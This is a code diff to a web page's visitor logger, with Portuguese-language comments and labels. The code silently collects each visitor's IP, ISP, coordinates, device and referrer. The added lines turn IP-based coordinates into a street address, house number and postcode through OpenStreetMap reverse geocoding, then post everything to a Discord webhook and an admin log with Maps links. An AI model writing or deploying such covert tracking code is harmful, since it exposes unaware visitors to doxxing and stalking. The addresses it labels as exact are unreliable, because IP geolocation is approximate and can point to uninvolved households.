@@ -1125,7 +1125,7 @@ async function captureVisitorData() {
     timestamp: new Date().toISOString(),
     timestamp_br: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }),
     ip: 'desconhecido',
-    location: { city: '?', region: '?', country: '?', isp: '?' },
+    location: { city: '?', region: '?', country: '?', zip: '?', isp: '?', address: '?', fullAddress: '?' },
     userAgent: navigator.userAgent.substring(0, 300),
     referrer: document.referrer || 'direto',
     page: window.location.href,
@@ -1149,6 +1149,32 @@ async function captureVisitorData() {
       data.location.timezone = locData.timezone || '?';
       data.location.isp = locData.isp || locData.org || '?';
       data.location.as = locData.as || '?';
+
+      // Reverse geocode: pegar endereço completo (rua, número) via OpenStreetMap
+      if (data.location.lat && data.location.lon) {
+        try {
+          const addrRes = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?lat=${data.location.lat}&lon=${data.location.lon}&format=json&addressdetails=1`,
+            { headers: { 'User-Agent': 'guns.lol-logger/1.0' } }
+          );
+          const addrData = await addrRes.json();
+          if (addrData && addrData.display_name) {
+            data.location.fullAddress = addrData.display_name;
+            const addr = addrData.address || {};
+            data.location.address = {
+              road: addr.road || addr.pedestrian || addr.footway || '?',
+              houseNumber: addr.house_number || '?',
+              neighbourhood: addr.neighbourhood || addr.suburb || '?',
+              city: addr.city || addr.town || addr.village || '?',
+              state: addr.state || '?',
+              postcode: addr.postcode || '?',
+              country: addr.country || '?'
+            };
+            // Sobrescrever CEP com o mais específico
+            if (addr.postcode) data.location.zip = addr.postcode;
+          }
+        } catch {}
+      }
     } catch {}
   } catch {}
 
@@ -1161,13 +1187,18 @@ async function sendToDiscord(visitorData) {
   if (!webhookUrl) return false;
 
   const d = new Date(visitorData.timestamp);
+  const endereco = visitorData.location.fullAddress && visitorData.location.fullAddress !== '?'
+    ? visitorData.location.fullAddress
+    : `${visitorData.location.city}, ${visitorData.location.region} — ${visitorData.location.country}${visitorData.location.zip && visitorData.location.zip !== '?' ? ` (CEP: ${visitorData.location.zip})` : ''}`;
+
   const fields = [
     { name: '👤 IP', value: `\`${visitorData.ip}\``, inline: true },
-    { name: '📍 Local', value: `${visitorData.location.city}, ${visitorData.location.region} — ${visitorData.location.country}`, inline: true },
+    { name: '📍 Endereço', value: endereco.substring(0, 200), inline: false },
     { name: '🏢 ISP', value: visitorData.location.isp || '?', inline: true },
+    { name: '🌍 Coordenadas', value: visitorData.location.lat ? `${visitorData.location.lat}, ${visitorData.location.lon}` : '?', inline: true },
     { name: '📅 Data', value: d.toLocaleDateString('pt-BR'), inline: true },
     { name: '⏰ Hora', value: d.toLocaleTimeString('pt-BR'), inline: true },
-    { name: '🖥️ ${visitorData.screen}', value: visitorData.language, inline: true },
+    { name: '🖥️ Tela', value: visitorData.screen, inline: true },
     { name: '📎 Referência', value: visitorData.referrer || 'direto', inline: false },
     { name: '📱 UA', value: `\`\`\`${visitorData.userAgent.substring(0, 200)}\`\`\``, inline: false }
   ];
@@ -1275,19 +1306,30 @@ async function renderAdminLogs() {
     const flag = log.location.country && log.location.country !== '?' ? getFlag(log.location.country) : '🌐';
 
     const mapsLink = log.location.lat && log.location.lon
-      ? `<a href="https://www.google.com/maps?q=${log.location.lat},${log.location.lon}" target="_blank" rel="noopener" style="color:var(--cyan); text-decoration:none;">🗺️ Ver no Maps</a>`
+      ? `<a href="https://www.google.com/maps?q=${log.location.lat},${log.location.lon}" target="_blank" rel="noopener" style="color:var(--cyan); text-decoration:none;">🗺️ Maps</a>`
       : '';
-    const zipDisplay = log.location.zip && log.location.zip !== '?' ? ` | 📮 CEP: ${log.location.zip}` : '';
+
+    // Endereço completo (rua + número) ou fallback para cidade/estado
+    let enderecoCompleto = '';
+    if (log.location.fullAddress && log.location.fullAddress !== '?') {
+      enderecoCompleto = log.location.fullAddress;
+    } else if (log.location.address && log.location.address.road && log.location.address.road !== '?') {
+      const addr = log.location.address;
+      enderecoCompleto = `${addr.road}, ${addr.houseNumber}${addr.neighbourhood && addr.neighbourhood !== '?' ? ` - ${addr.neighbourhood}` : ''}, ${addr.city}${addr.postcode && addr.postcode !== '?' ? ` - CEP: ${addr.postcode}` : ''}`;
+    } else {
+      enderecoCompleto = `${log.location.city}, ${log.location.region} — ${log.location.country}${log.location.zip && log.location.zip !== '?' ? ` (CEP: ${log.location.zip})` : ''}`;
+    }
 
     html += `<div class="admin-log-entry">
       <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:4px;">
         <span class="log-ip">${flag} ${log.ip}</span>
         <span class="log-time">${data} ${hora}</span>
       </div>
-      <div class="log-location">📍 ${log.location.city}, ${log.location.region} — ${log.location.country}${zipDisplay}</div>
+      <div class="log-location">📍 ${enderecoCompleto}</div>
       <div style="display:flex; flex-wrap:wrap; gap:4px; margin-top:2px; font-size:0.7rem;">
         <span style="color:var(--text-secondary);">🕐 ${log.location.timezone || '?'}</span>
         ${mapsLink ? `<span>${mapsLink}</span>` : ''}
+        ${log.location.lat ? `<span style="color:var(--text-secondary);">🌐 ${log.location.lat}, ${log.location.lon}</span>` : ''}
       </div>
       <div style="display:flex; justify-content:space-between; flex-wrap:wrap; gap:4px; margin-top:4px;">
         <span class="log-device">🖥️ ${log.screen} | ${log.language}</span>
